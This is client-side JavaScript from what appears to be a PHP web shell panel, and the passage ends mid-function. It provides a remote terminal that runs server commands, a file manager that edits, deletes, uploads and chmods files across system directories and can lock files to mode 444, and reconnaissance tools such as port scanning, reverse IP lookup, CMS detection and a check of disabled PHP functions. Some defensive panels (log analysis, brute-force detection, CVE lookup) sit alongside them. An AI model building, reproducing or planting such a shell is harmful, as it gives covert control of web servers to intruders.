        (()=>{const fi=document.getElementById('filter-in');if(fi)fi.addEventListener('input',()=>{const q=fi.value.toLowerCase();let shown=0;document.getElementById('terminal1').querySelectorAll('.entry').forEach(e=>{const m=!q||e.textContent.toLowerCase().includes(q);e.style.display=m?'':'none';if(m)shown++;});document.getElementById('filter-cnt').textContent=q?shown+' entries':'';}); const fb=document.getElementById('filter-bar');const pane1=document.getElementById('terminal1');if(pane1&&fb)pane1.parentElement?.insertBefore(fb,pane1);})();
        let hsPaneCtx=1;
        function openHistSrch(pane=1){hsPaneCtx=pane;const ov=document.getElementById('hist-srch');ov.style.display='block';const si=document.getElementById('hs-in');si.value='';si.focus();renderHS('');}
        function closeHS(){document.getElementById('hist-srch').style.display='none';document.getElementById('cmd'+hsPaneCtx).focus();}
        function renderHS(q){const res=document.getElementById('hs-res');const matches=[...new Set([...P[hsPaneCtx].hist].reverse())].filter(h=>!q||h.toLowerCase().includes(q.toLowerCase())).slice(0,12);res.innerHTML=matches.map(h=>`<div onclick="pickHS('${h.replace(/'/g,"\\'")}')" style="padding:3px 6px;border-radius:3px;cursor:pointer;font-size:10px;color:var(--t);transition:background .1s" onmouseover="this.style.background='rgba(245,158,11,.15)'" onmouseout="this.style.background=''">${esc(h)}</div>`).join('')||`<div style="color:var(--dim);font-size:9px">No history.</div>`;}
        function pickHS(cmd){document.getElementById('cmd'+hsPaneCtx).value=cmd;closeHS();}
        (()=>{const i=document.getElementById('hs-in');if(i){i.addEventListener('input',e=>renderHS(e.target.value));i.addEventListener('keydown',e=>{if(e.key==='Escape')closeHS();if(e.key==='Enter'){const f=document.getElementById('hs-res').querySelector('div');if(f)f.click();}});}})();
        const PAL_CMDS=[
            {l:'Clear terminal',a:()=>clearTerm(1)},{l:'Search output',a:()=>toggleSrch(1)},
            {l:'Filter output',a:()=>openFilter(1)},{l:'Toggle split',a:()=>toggleSplit()},
            {l:'Show history',a:()=>{document.getElementById('cmd1').value='history';runCmd(1);}},
            {l:'Disk usage',a:()=>{document.getElementById('cmd1').value='df -h';runCmd(1);}},
            {l:'Memory usage',a:()=>{document.getElementById('cmd1').value='free -m';runCmd(1);}},
            {l:'Processes',a:()=>{document.getElementById('cmd1').value='ps aux';runCmd(1);}},
            {l:'Network',a:()=>{document.getElementById('cmd1').value='ifconfig 2>/dev/null||ip addr';runCmd(1);}},
            {l:'Listening ports',a:()=>{document.getElementById('cmd1').value='ss -tlnp 2>/dev/null||netstat -tlnp';runCmd(1);}},
            {l:'Current user',a:()=>{document.getElementById('cmd1').value='id';runCmd(1);}},
            {l:'PHP version',a:()=>{document.getElementById('cmd1').value='php -v';runCmd(1);}},
            {l:'List dir',a:()=>{document.getElementById('cmd1').value='ls -la';runCmd(1);}},
            {l:'Parent dir',a:()=>{document.getElementById('cmd1').value='cd ..';runCmd(1);}},
            {l:'Dir back',a:()=>cwdBack()},{l:'Dir forward',a:()=>cwdFwd()},
            {l:'Refresh files',a:()=>fmLoad(fmDir)},
            {l:'Security tools',a:()=>{document.querySelectorAll('.nb,.panel').forEach(e=>e.classList.remove('on'));document.getElementById('panel-security').classList.add('on');}},
            {l:'CVE lookup',a:()=>{document.querySelectorAll('.nb,.panel').forEach(e=>e.classList.remove('on'));document.getElementById('panel-cve').classList.add('on');}},
            {l:'PHP Security Checklist',a:()=>doSecCL()},
            {l:'CVE terbaru',a:()=>{cveTab('recent',null);doCVER();}},
            {l:'Fullscreen terminal',a:()=>toggleFS('panel-terminal')},
            {l:'Uptime',a:()=>{document.getElementById('cmd1').value='uptime';runCmd(1);}},
        ];
        let palCtx=1;
        function openPalette(pane=1){palCtx=pane;const p=document.getElementById('palette');p.style.display='block';const pi=document.getElementById('pal-in');pi.value='';pi.focus();renderPal('');}
        function renderPal(q){const res=document.getElementById('pal-res');const histM=[...new Set([...P[palCtx].hist].reverse())].filter(h=>q&&h.toLowerCase().includes(q.toLowerCase())).slice(0,5).map(h=>({l:'⌛ '+h,a:()=>{document.getElementById('cmd'+palCtx).value=h;document.getElementById('palette').style.display='none';}}));const items=[...histM,...PAL_CMDS].filter(i=>!q||i.l.toLowerCase().includes(q.toLowerCase())).slice(0,20);window._palItems=items;res.innerHTML=items.map((item,i)=>`<div onclick="palExec(${i})" style="padding:5px 8px;border-radius:4px;cursor:pointer;font-size:10px;color:var(--t);transition:background .1s;display:flex;align-items:center;gap:6px" onmouseover="this.style.background='rgba(245,158,11,.15)'" onmouseout="this.style.background=''">${esc(item.l)}</div>`).join('')||'<div style="color:var(--dim);font-size:9px;padding:4px">No results.</div>';}
        window.palExec=function(i){const item=window._palItems?.[i];if(item){item.a();document.getElementById('palette').style.display='none';}};
        (()=>{const pi=document.getElementById('pal-in');if(pi){pi.addEventListener('input',e=>renderPal(e.target.value));pi.addEventListener('keydown',e=>{if(e.key==='Escape')document.getElementById('palette').style.display='none';if(e.key==='Enter'){const f=document.getElementById('pal-res').querySelector('div');if(f)f.click();}});}})();
        function openML(){document.getElementById('ml-ov').style.display='block';document.getElementById('ml-in').focus();}
        function closeML(){document.getElementById('ml-ov').style.display='none';document.getElementById('cmd1').focus();}
        async function runML(){const cmds=document.getElementById('ml-in').value.split('\n').map(c=>c.trim()).filter(Boolean);closeML();for(const cmd of cmds){document.getElementById('cmd1').value=cmd;await runCmd(1);await new Promise(r=>setTimeout(r,200));}}
        (()=>{const mi=document.getElementById('ml-in');if(mi){mi.addEventListener('keydown',e=>{if(e.ctrlKey&&e.key==='Enter'){e.preventDefault();runML();}if(e.key==='Escape')closeML();});}})();
        let acT;
        [1,2].forEach(pane=>{const inp=document.getElementById('cmd'+pane);if(inp)inp.addEventListener('input',()=>{clearTimeout(acT);acPane=pane;acT=setTimeout(()=>trigAc(pane),250);});});
        async function trigAc(pane){const p=document.getElementById('cmd'+pane).value;if(!p.trim()){closeAc();return;}try{const r=await post({action:'autocomplete',partial:p});if(!r.suggestions?.length){closeAc();return;}showAc(r.suggestions,pane);}catch{}}
        function showAc(items,pane){acItems=items;acActive=-1;acPane=pane;const ac=document.getElementById('ac');ac.innerHTML=items.map(s=>`<div class="aci" onclick="applyAc('${s.replace(/'/g,"\\'")}')">${esc(s)}</div>`).join('');const rect=document.getElementById('cmd'+pane).getBoundingClientRect();ac.style.left=rect.left+'px';ac.style.bottom=(window.innerHeight-rect.top+4)+'px';ac.style.display='block';}
        function moveAc(d){const its=document.getElementById('ac').querySelectorAll('.aci');if(acActive>=0)its[acActive].classList.remove('on');acActive=Math.max(-1,Math.min(acItems.length-1,acActive+d));if(acActive>=0)its[acActive].classList.add('on');}
        function applyAc(s,pane){pane=pane||acPane;const inp=document.getElementById('cmd'+pane);const p=inp.value.split(/\s+/);p[p.length-1]=s;inp.value=p.join(' ');closeAc();inp.focus();}
        function closeAc(){document.getElementById('ac').style.display='none';acItems=[];acActive=-1;}
        function eA(s){return s.replace(/\\/g,'\\\\').replace(/'/g,"\\'");}
        function setFmV(m){fmView=m;document.getElementById('fvb-l').classList.toggle('on',m==='list');document.getElementById('fvb-g').classList.toggle('on',m==='grid');renderFM();}
        function fmFilter(){renderFM();}
        function fmSortChg(){fmSort=document.getElementById('fm-sort').value;renderFM();}
        function sortIt(items){const[col,dir]=fmSort.includes('-d')?[fmSort.replace('-d',''),'d']:[fmSort,'a'];return[...items].sort((a,b)=>{if(a.type!==b.type)return a.type==='dir'?-1:1;let c=0;if(col==='name')c=a.name.localeCompare(b.name);else if(col==='size')c=(a.size||0)-(b.size||0);else if(col==='date')c=(a.mtime||0)-(b.mtime||0);return dir==='d'?-c:c;});}
        async function fmLoad(dir){
            document.getElementById('fm-list').innerHTML='<div style="padding:9px;color:var(--dim);font-size:9px">Loading...</div>';
            const r=await post({action:'ls',dir});if(!r.items)return;
            fmDir=r.dir;fmAll=r.items;document.getElementById('up-dir').textContent=r.dir;
            const parts=r.dir.split('/').filter(Boolean);let bh='<span class="bc" onclick="fmLoad(\'/\')">/ </span>';let built='/';
            parts.forEach(p=>{built+=(built==='/'?'':'/')+p;const b=built;bh+=`<span style="color:var(--dim);">/</span><span class="bc" onclick="fmLoad('${b.replace(/'/g,"\\'")}')">${esc(p)}</span>`;});
            document.getElementById('fm-bread').innerHTML=bh;renderFM();
        }
        function renderFM(){
            const q=(document.getElementById('fm-search')?.value||'').toLowerCase();
            let items=fmAll.filter(i=>!q||i.name.toLowerCase().includes(q));items=sortIt(items);
            document.getElementById('fm-stat').textContent=items.length+' items';
            const list=document.getElementById('fm-list');list.className=fmView==='grid'?'grid':'';
            selFiles.clear();updBulk();
            list.innerHTML=items.map(item=>{
                const full=fmDir.replace(/\/+$/,'')+'/'+item.name;
                const fE=eA(full);const nE=eA(item.name);
                const icon=item.type==='dir'?'📁':ficon(item.ext);
                const isImg=IMG_EXTS.includes(item.ext);const isTxt=TXT_EXTS.includes(item.ext);
                const prev=isImg&&fmView==='list'?`<img class="fmi-prev" src="${esc(full)}" loading="lazy" onerror="this.style.display='none'">`:'';
            const gPrev=isImg&&fmView==='grid'?`<img style="width:44px;height:44px;object-fit:cover;border-radius:2px;border:1px solid var(--b)" src="${esc(full)}" loading="lazy" onerror="this.style.display='none'">`:'';
            const acts=`<div style="display:flex;gap:1px">
            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();openEd('${fE}','${nE}')" title="Edit">Edit</button>`:''}
            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();fmClone('${fE}')" title="Clone">Clone</button>`:''}
            <button class="fma" onclick="event.stopPropagation();openRename('${fE}','${nE}')" title="Rename">Rename</button>
            <button class="fma lk" onclick="event.stopPropagation();fmC775('${fE}')" title="Lock 775">Lock</button>
            <button class="fma lk" onclick="event.stopPropagation();fmC444('${fE}')" title="Lock 444">Lock</button>
            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();fmZip('${fE}')" title="Zip">Zip</button>`:''}
            ${item.ext==='zip'?`<button class="fma" onclick="event.stopPropagation();fmUnzip('${fE}')" title="Unzip">Unzip</button>`:''}
            ${isTxt?`<button class="fma" onclick="event.stopPropagation();fmPrev('${fE}')" title="Preview">Preview</button>`:''}
            <button class="fma" onclick="event.stopPropagation();copyPath('${fE}')" title="Copy path">Copy</button>
            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();fmDl('${fE}','${nE}')" title="Download">Download</button>`:''}
            <button class="fma del" onclick="event.stopPropagation();fmDel('${fE}','${nE}')" title="Delete">Delete</button>
            </div>`;
            if(fmView==='grid')return`<div class="fmi grid-item ${item.type==='dir'?'fmi-dir':''}" onclick="fmClick('${fmDir}','${nE}','${item.type}')">${gPrev||`<span class="fmi-icon">${icon}</span>`}<span class="fmi-name">${esc(item.name)}</span>${acts}</div>`;
            return`<div class="fmi ${item.type==='dir'?'fmi-dir':''} ${selFiles.has(full)?'sel':''}" onclick="fmClick('${fmDir}','${nE}','${item.type}')">
            <input type="checkbox" ${selFiles.has(full)?'checked':''} onclick="event.stopPropagation();toggleSel('${fE}')">
            ${prev||`<span class="fmi-icon">${icon}</span>`}
            <span class="fmi-name">${esc(item.name)}</span>
            <span class="fmi-meta"><span style="color:${item.writable?'var(--a3)':'var(--faint)'}">${item.perms}</span><span>${item.mtime_str}</span><span>${fmtSz(item.size)}</span></span>
            ${acts}
            </div>`;
            }).join('')||'<div style="padding:9px;color:var(--dim);font-size:9px">Empty</div>';
        }
        function toggleSel(full){if(selFiles.has(full))selFiles.delete(full);else selFiles.add(full);updBulk();renderFM();}
        function clearSel(){selFiles.clear();updBulk();renderFM();}
        function updBulk(){const b=document.getElementById('bulk-bar'),n=selFiles.size;b.className=n>0?'show':'';document.getElementById('bulk-count').textContent=n+' selected';}
        async function bulkDel(){if(!selFiles.size)return;if(!confirm('Delete '+selFiles.size+' files?'))return;const r=await post({action:'bulk_delete',files:JSON.stringify([...selFiles])});toast(r.msg,r.ok?'ok':'err');clearSel();fmLoad(fmDir);}
        async function bulkChmod(mode){if(!selFiles.size)return;const r=await post({action:'bulk_chmod',files:JSON.stringify([...selFiles]),mode});toast(r.msg,r.ok?'ok':'err');clearSel();fmLoad(fmDir);}
        async function buildTree(){const qs=['/','~','/var/www','/tmp','/etc',fmDir];document.getElementById('fm-tree').innerHTML=qs.map(d=>`<div class="ftree ${d===fmDir?'on':''}" onclick="fmLoad('${eA(d)}')">📁 ${esc(d)}</div>`).join('');}
        function fmClick(dir,name,type){if(type==='dir'){fmLoad(name==='..'?dir.split('/').slice(0,-1).join('/')||'/':dir.replace(/\/+$/,'')+'/'+name);buildTree();}}
        function fmUp(){fmLoad(fmDir.split('/').slice(0,-1).join('/')||'/');buildTree();}
        function fmRefresh(){fmLoad(fmDir);}
        async function fmDel(full,name){if(!confirm('Delete "'+name+'"?'))return;const r=await post({action:'delete',file:full});toast(r.ok?'Deleted: '+name:'Failed: '+(r.msg||''),r.ok?'ok':'err');if(r.ok)fmLoad(fmDir);}
        async function fmDl(full,name){const fd=new FormData();fd.append('action','download');fd.append('file',full);fd.append('csrf',CSRF);const res=await fetch(location.href,{method:'POST',body:fd});const blob=await res.blob();const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=name;a.click();}
        async function fmMkdir(){const n=document.getElementById('fm-new').value.trim();if(!n)return;const r=await post({action:'mkdir_action',name:n});toast(r.ok?'Dir created!':'Failed',r.ok?'ok':'err');document.getElementById('fm-new').value='';if(r.ok)fmLoad(fmDir);}
        async function fmClone(full){const r=await post({action:'clone',file:full});toast(r.msg,r.ok?'ok':'err');if(r.ok)fmLoad(fmDir);}
        async function fmC775(full){const r=await post({action:'chmod775',file:full});toast(r.msg,r.ok?'ok':'err');if(r.ok)fmLoad(fmDir);}
        async function fmC444(full){const r=await post({action:'chmod444',file:full});toast(r.msg,r.ok?'ok':'err');if(r.ok)fmLoad(fmDir);}
        async function fmZip(full){const r=await post({action:'zip',file:full});toast(r.msg,r.ok?'ok':'err');if(r.ok)fmLoad(fmDir);}
        async function fmUnzip(full){const r=await post({action:'unzip',file:full});toast(r.msg,r.ok?'ok':'err');if(r.ok)fmLoad(fmDir);}
        async function fmPrev(full){const r=await post({action:'read',file:full});if(!r.ok){toast('Cannot preview','err');return;}const pid='pv-'+btoa(full).replace(/[^a-z0-9]/gi,'').slice(0,18);const box=document.getElementById(pid);if(!box)return;if(box.classList.contains('on')){box.classList.remove('on');return;}box.textContent=r.content.substring(0,400)+(r.content.length>400?'\n...':'');box.classList.add('on');}
        function copyPath(full){navigator.clipboard?.writeText(full).then(()=>toast('Path copied!','ok')).catch(()=>toast('Copy failed','err'));}
        function openRename(full,name){rnFile=full;document.getElementById('rn-n').value=name;showOv('rename-ov');setTimeout(()=>document.getElementById('rn-n').focus(),100);}
        async function doRename(){const nn=document.getElementById('rn-n').value.trim();if(!nn)return;const r=await post({action:'rename',file:rnFile,newname:nn});toast(r.msg,r.ok?'ok':'err');closeOv('rename-ov');if(r.ok)fmLoad(fmDir);}
        async function doUpload(){const files=document.getElementById('up-f').files;if(!files.length)return;for(const f of files){const fd=new FormData();fd.append('action','upload');fd.append('file',f);fd.append('dest_dir',fmDir);fd.append('csrf',CSRF);const r=await(await fetch(location.href,{method:'POST',body:fd})).json();toast(r.msg,r.ok?'ok':'err');}closeOv('upload-ov');fmLoad(fmDir);}
        function handleDrop(e){e.preventDefault();document.getElementById('dz').classList.remove('drag');const files=e.dataTransfer.files;if(!files.length)return;const dt=new DataTransfer();Array.from(files).forEach(f=>dt.items.add(f));document.getElementById('up-f').files=dt.files;doUpload();}
        let chFileV='';
        function openChmod(full){chFileV=full;document.getElementById('ch-f').value=full;showOv('chmod-ov');}
        async function doChmod(){const mode=document.getElementById('ch-m').value;const r=await post({action:'chmod',file:chFileV,mode});toast(r.msg,r.ok?'ok':'err');closeOv('chmod-ov');fmLoad(fmDir);}
        async function openEd(full,name){const ex=edFiles.findIndex(f=>f.path===full);if(ex>=0){edIdx=ex;loadEdContent();showOv('ed-ov');return;}const r=await post({action:'read',file:full});if(!r.ok){toast('Cannot open: '+(r.msg||''),'err');return;}edFiles.push({path:r.file,name,content:r.content,saved:true});edIdx=edFiles.length-1;renderEdTabs();loadEdContent();showOv('ed-ov');document.getElementById('ed-area').focus();startAS();}
        function renderEdTabs(){document.getElementById('ed-tabs').innerHTML=edFiles.map((f,i)=>`<div class="ed-tab ${i===edIdx?'on':''}" onclick="swEdTab(${i})">${esc(f.name)}${f.saved?'':' ●'}<span class="ed-tab-x" onclick="event.stopPropagation();edCloseByIdx(${i})">✕</span></div>`).join('');}
        function swEdTab(i){edIdx=i;loadEdContent();}
        function loadEdContent(){if(!edFiles[edIdx])return;const f=edFiles[edIdx];document.getElementById('ed-name').textContent=f.name;document.getElementById('ed-status').textContent='';document.getElementById('ed-area').value=f.content;updLN();updPos();}
        function edCloseTab(){edCloseByIdx(edIdx);}
        function edCloseByIdx(i){if(!edFiles[i].saved&&!confirm('Not saved. Close?'))return;edFiles.splice(i,1);if(!edFiles.length){closeOv('ed-ov');clearAS();return;}edIdx=Math.min(edIdx,edFiles.length-1);renderEdTabs();loadEdContent();}
        function updLN(){const ta=document.getElementById('ed-area');const ln=ta.value.split('\n').length;document.getElementById('ed-lines').innerHTML=Array.from({length:ln},(_,i)=>i+1).join('\n');document.getElementById('ed-chars').textContent=ta.value.length+' chars';}
        function updPos(){const ta=document.getElementById('ed-area');const val=ta.value.substr(0,ta.selectionStart);const ln=val.split('\n').length;const col=val.split('\n').pop().length+1;document.getElementById('ed-pos').textContent=`Ln ${ln}, Col ${col}`;}
        document.getElementById('ed-area').addEventListener('input',()=>{updLN();if(edFiles[edIdx]){edFiles[edIdx].content=document.getElementById('ed-area').value;edFiles[edIdx].saved=false;renderEdTabs();}});
        document.getElementById('ed-area').addEventListener('keyup',updPos);
        document.getElementById('ed-area').addEventListener('click',updPos);
        document.getElementById('ed-area').addEventListener('scroll',function(){document.getElementById('ed-lines').scrollTop=this.scrollTop;});
        async function saveFile(){if(!edFiles[edIdx])return;const f=edFiles[edIdx];const r=await post({action:'write',file:f.path,content:document.getElementById('ed-area').value});const s=document.getElementById('ed-status');if(r.ok){f.saved=true;f.content=document.getElementById('ed-area').value;renderEdTabs();}s.textContent=r.ok?'✓ Saved':'✗ Error';s.style.color=r.ok?'var(--a3)':'var(--d)';toast(r.ok?'Saved!':r.msg||'Failed',r.ok?'ok':'err');}
        function startAS(){clearAS();edAsTimer=setInterval(async()=>{if(!edFiles[edIdx]||edFiles[edIdx].saved)return;await saveFile();document.getElementById('ed-autosave').textContent='↺ auto-saved';setTimeout(()=>document.getElementById('ed-autosave').textContent='',1500);},30000);}
        function clearAS(){if(edAsTimer){clearInterval(edAsTimer);edAsTimer=null;}}
        function toggleEdWrap(){edWrap=!edWrap;const ta=document.getElementById('ed-area');ta.style.whiteSpace=edWrap?'pre-wrap':'pre';ta.style.overflowX=edWrap?'hidden':'auto';document.getElementById('ed-wrap-tog').textContent='Wrap:'+(edWrap?'ON':'OFF');document.getElementById('ed-wrap-tog').style.color=edWrap?'var(--a)':'';}
        function toggleFR(){document.getElementById('ed-fr').classList.toggle('on');}
        function doFR(){const ta=document.getElementById('ed-area');const find=document.getElementById('fr-find').value;const rep=document.getElementById('fr-rep').value;if(!find)return;const re=new RegExp(find.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'g');const bef=ta.value;ta.value=ta.value.replace(re,rep);const count=(bef.match(re)||[]).length;document.getElementById('fr-info').textContent=count+' replaced';updLN();}
        function toggleGoto(){document.getElementById('ed-goto').classList.toggle('on');if(document.getElementById('ed-goto').classList.contains('on'))document.getElementById('goto-ln').focus();}
        function doGoto(){const ln=parseInt(document.getElementById('goto-ln').value)-1;const ta=document.getElementById('ed-area');const lines=ta.value.split('\n');if(ln<0||ln>=lines.length)return;const pos=lines.slice(0,ln).join('\n').length+(ln>0?1:0);ta.setSelectionRange(pos,pos+lines[ln].length);ta.focus();ta.scrollTop=ln*parseFloat(getComputedStyle(ta).lineHeight||'18')-ta.clientHeight/2;updPos();}
        document.getElementById('ed-area').addEventListener('keydown',e=>{
            if(e.ctrlKey&&e.key==='s'){e.preventDefault();saveFile();}
            if(e.ctrlKey&&e.key==='h'){e.preventDefault();toggleFR();}
            if(e.ctrlKey&&e.key==='g'){e.preventDefault();toggleGoto();}
            if(e.ctrlKey&&e.key==='w'){e.preventDefault();edCloseTab();}
            if(e.key==='Tab'){e.preventDefault();const t=e.target,s=t.selectionStart;t.value=t.value.substring(0,s)+'    '+t.value.substring(t.selectionEnd);t.selectionStart=t.selectionEnd=s+4;updLN();}
        });
        async function doWhois(){const d=document.getElementById('w-d').value.trim();if(!d)return;document.getElementById('w-r').textContent='Loading...';const r=await post({action:'whois',domain:d});document.getElementById('w-r').textContent=r.out||'No result';}
        async function doRIP(){const ip=document.getElementById('ri-i').value.trim();if(!ip)return;document.getElementById('ri-r').textContent='Loading...';const r=await post({action:'reverseip',ip});document.getElementById('ri-r').textContent=r.out;}
        async function doPScan(){const h=document.getElementById('ps-h').value.trim(),p=document.getElementById('ps-p').value;if(!h)return;document.getElementById('ps-r').textContent='Scanning...';const r=await post({action:'portscan',host:h,ports:p});document.getElementById('ps-r').textContent=r.out;}
        async function doHashGen(){const s=document.getElementById('hg-i').value;if(!s)return;const r=await post({action:'hashgen',str:s});document.getElementById('hg-r').textContent=r.out;}
        async function doHashID(){const h=document.getElementById('hi-i').value.trim();if(!h)return;const r=await post({action:'hashid',hash:h});document.getElementById('hi-r').textContent=r.out;}
        async function doStr(op){const s=document.getElementById('st-i').value;const r=await post({action:'stringtools',str:s,op});document.getElementById('st-r').textContent=r.out;}
        async function doCMS(){const u=document.getElementById('cm-u').value.trim();if(!u)return;document.getElementById('cm-r').textContent='Detecting...';const r=await post({action:'cmsdetect',url:u});document.getElementById('cm-r').textContent=r.out;}
        async function doDF(){document.getElementById('df-r').textContent='Checking...';const r=await post({action:'disablefunc'});document.getElementById('df-r').textContent=r.out;}
        async function doSI(){document.getElementById('si-r').textContent='Loading...';const r=await post({action:'sysinfo'});document.getElementById('si-r').textContent=r.out;}
        async function doPS(){document.getElementById('si-ps').textContent='Loading...';const r=await post({action:'stats'});document.getElementById('si-ps').textContent=r.processes||'N/A';}
        function ddir(id){return document.getElementById(id).value.trim()||fmDir;}
        async function doDS(){const q=document.getElementById('ds-q').value.trim();if(!q){toast('Query empty','err');return;}document.getElementById('ds-r').textContent='Searching...';const r=await post({action:'deepsearch',query:q,dir:ddir('ds-dir'),stype:document.getElementById('ds-t').value,ext:document.getElementById('ds-e').value});document.getElementById('ds-r').textContent=r.out||'No result';}
        async function doDScan(){document.getElementById('dsc-r').textContent='Scanning...';const r=await post({action:'deepscan',dir:ddir('dsc-d'),depth:document.getElementById('dsc-dep').value});document.getElementById('dsc-r').textContent=r.out;}
        async function doDA(){document.getElementById('da-r').textContent='Analyzing...';const r=await post({action:'deepanalysis',dir:ddir('da-d')});document.getElementById('da-r').textContent=r.out;}
        async function doSnap(){const dir=ddir('dm-d');const r=await post({action:'deepmonitor',dir});document.getElementById('dm-r').textContent=r.msg||'Done';toast(r.msg,'ok');}
        async function doSnapChk(){const dir=ddir('dm-d');document.getElementById('dm-r').textContent='Checking...';const r=await post({action:'deepmonitor_check',dir});document.getElementById('dm-r').textContent=r.out;}
        async function doDiff(){const f1=document.getElementById('diff-f1').value.trim(),f2=document.getElementById('diff-f2').value.trim();if(!f1||!f2)return;document.getElementById('diff-r').textContent='Comparing...';const r=await post({action:'diff',file1:f1,file2:f2});if(!r.ok){document.getElementById('diff-r').textContent=r.msg||'Error';return;}document.getElementById('diff-r').innerHTML=r.out.split('\n').map(l=>l.startsWith('+')?`<div class="diff-add">${esc(l)}</div>`:l.startsWith('-')?`<div class="diff-del">${esc(l)}</div>`:l.startsWith('@@')?`<div class="diff-hdr">${esc(l)}</div>`:`<div>${esc(l)}</div>`).join('');}
        function secRbox(el,html){const box=document.getElementById(el);box.innerHTML=`<pre style="white-space:pre-wrap;font-family:inherit;font-size:inherit">${html}</pre>`;}
        function renderSec(txt){return esc(txt).replace(/✅/g,'<span style="color:var(--a3)">✅</span>').replace(/❌/g,'<span style="color:var(--d)">❌</span>').replace(/🔴/g,'<span style="color:var(--d)">🔴</span>').replace(/🟠/g,'<span style="color:#f97316">🟠</span>').replace(/🟡/g,'<span style="color:var(--w)">🟡</span>').replace(/⚠/g,'<span style="color:var(--w)">⚠</span>');}
        function scoreBar(score,total){const pct=total?Math.round(score/total*100):0;const c=pct>=80?'var(--a3)':pct>=50?'var(--w)':'var(--d)';return`<div class="score-bar"><div class="score-fill" style="width:${pct}%;background:${c}"></div></div>`;}
        async function doPermAudit(){const dir=document.getElementById('pa-d').value.trim()||fmDir;document.getElementById('pa-r').textContent='Auditing...';const r=await post({action:'perm_audit',dir});secRbox('pa-r',renderSec(r.out||'Error'));if(r.count>0)toast(`⚠ ${r.count} issues!`,'err');else toast('Permission OK','ok');}
        async function doLogAn(){const custom=document.getElementById('la-c').value.trim();const lf=custom||document.getElementById('la-f').value;document.getElementById('la-r').textContent='Analyzing...';const r=await post({action:'log_analyze',logfile:lf});if(!r.ok){document.getElementById('la-r').textContent=r.out;return;}const html=renderSec(r.out).replace(/SQL Injection/g,'<span style="color:var(--d);font-weight:700">SQL Injection</span>').replace(/XSS/g,'<span style="color:var(--d)">XSS</span>').replace(/Scanner/g,'<span style="color:#f97316">Scanner</span>').replace(/Shell Inject/g,'<span style="color:var(--d);font-weight:700">Shell Inject</span>');secRbox('la-r',html);if(r.count>0)toast(`🚨 ${r.count} suspicious!`,'err');else toast('Log clean','ok');}
        async function doBF(){const lf=document.getElementById('bf-f').value;document.getElementById('bf-r').textContent='Scanning...';const r=await post({action:'bruteforce_detect',logfile:lf});if(!r.ok){document.getElementById('bf-r').textContent=r.out;return;}secRbox('bf-r',renderSec(r.out));if(r.attackers>0)toast(`🚨 ${r.attackers} attacker!`,'err');else toast('Safe','ok');}
        async function doHTTPH(){const url=document.getElementById('hh-u').value.trim();if(!url){toast('Enter URL','err');return;}document.getElementById('hh-r').textContent='Checking...';const r=await post({action:'http_headers',url});if(!r.ok){document.getElementById('hh-r').textContent=r.out;return;}const pct=r.total?Math.round(r.score/r.total*100):0;const c=pct>=80?'var(--a3)':pct>=50?'var(--w)':'var(--d)';document.getElementById('hh-r').innerHTML=`${scoreBar(r.score,r.total)}<pre style="white-space:pre-wrap;font-family:inherit;font-size:inherit">${renderSec(r.out)}</pre>`;toast(`Header score: ${pct}%`,pct>=70?'ok':'err');}
        async function doSSL(){const h=document.getElementById('ssl-h').value.trim().replace(/^https?:\/\//,'');if(!h){toast('Enter hostname','err');return;}document.getElementById('ssl-r').textContent='Checking...';const r=await post({action:'ssl_info',host:h});if(!r.ok){document.getElementById('ssl-r').textContent=r.out;document.getElementById('ssl-r').style.color='var(--d)';return;}document.getElementById('ssl-r').style.color='';secRbox('ssl-r',renderSec(r.out));if(r.days!==undefined)toast(r.days>0?`SSL valid, ${r.days} days left`:'SSL EXPIRED!',r.days>30?'ok':'err');}
        async function doSecCL(){document.getElementById('sc-r').textContent='Running...';const r=await post({action:'sec_checklist'});const pct=r.total?Math.round(r.score/r.total*100):0;document.getElementById('sc-r').innerHTML=`${scoreBar(r.score,r.total)}<pre style="white-space:pre-wrap;font-family:inherit;font-size:inherit">${renderSec(r.out||'Error')}</pre>`;toast(`Checklist: ${pct}%`,pct>=80?'ok':'err');}
        function cveTab(tab,btn){['lookup','search','recent'].forEach(t=>{document.getElementById('cvep-'+t).style.display=t===tab?'flex':'none';document.getElementById('cve-tab-'+t)?.classList.toggle('on',t===tab);});}
        function cveSevHTML(txt){return esc(txt).replace(/\(CRITICAL\)/g,'<span style="color:var(--d);font-weight:700">(CRITICAL)</span>').replace(/\(HIGH\)/g,'<span style="color:#f97316;font-weight:700">(HIGH)</span>').replace(/\(MEDIUM\)/g,'<span style="color:var(--w)">(MEDIUM)</span>').replace(/\(LOW\)/g,'<span style="color:var(--a3)">(LOW)</span>').replace(/(CVE-\d{4}-\d+)/g,'<span style="color:var(--a);font-weight:700;cursor:pointer" onclick="document.getElementById(\'cve-id\').value=\'$1\';cveTab(\'lookup\',null);doCVEL()">$1</span>');}
        async function doCVEL() {
            const id = document.getElementById('cve-id').value.trim().toUpperCase();
            if (!id) {
                toast('Masukkan CVE ID', 'err');
                return;
            }
            if (!/^CVE-\d{4}-\d+$/.test(id)) {
                toast('Format CVE tidak valid (contoh: CVE-2024-1234)', 'err');
                return;
            }
            const res = document.getElementById('cve-l-r');
            res.innerHTML = '<span style="color:var(--dim)">⏳ Mengambil data dari NVD...</span>';
            res.style.color = '';
            try {
                const r = await post({ action: 'cve_lookup', cve_id: id });
                if (!r.ok) {
                    res.textContent = r.out || 'Error';
                    res.style.color = 'var(--d)';
                    return;
                }
                const severityColor = r.severity === 'CRITICAL' ? 'var(--d)' :
                r.severity === 'HIGH' ? '#f97316' :
                r.severity === 'MEDIUM' ? 'var(--w)' : 'var(--a3)';
                let html = `<div style="border-left:4px solid ${severityColor}; padding-left:10px; margin-bottom:6px;">`;
                html += `<div style="font-size:12px; font-weight:700; color:var(--a);">${esc(r.id)}</div>`;
                html += `<div style="font-size:10px; color:${severityColor}; font-weight:600;">Severity: ${esc(r.severity)} (Score: ${esc(r.score)})</div>`;
                html += `<div style="font-size:9px; color:var(--dim);">Published: ${esc(r.published)} | Modified: ${esc(r.lastModified)}</div>`;
                html += `</div>`;
                html += `<div style="font-size:10px; white-space:pre-wrap; word-break:break-word;">${esc(r.out)}</div>`;
                html += `<div style="margin-top:8px; font-size:9px;"><a href="https://nvd.nist.gov/vuln/detail/${esc(r.id)}" target="_blank" style="color:var(--a2);">🔗 Buka di NVD (detail lengkap)</a></div>`;
                res.innerHTML = html;
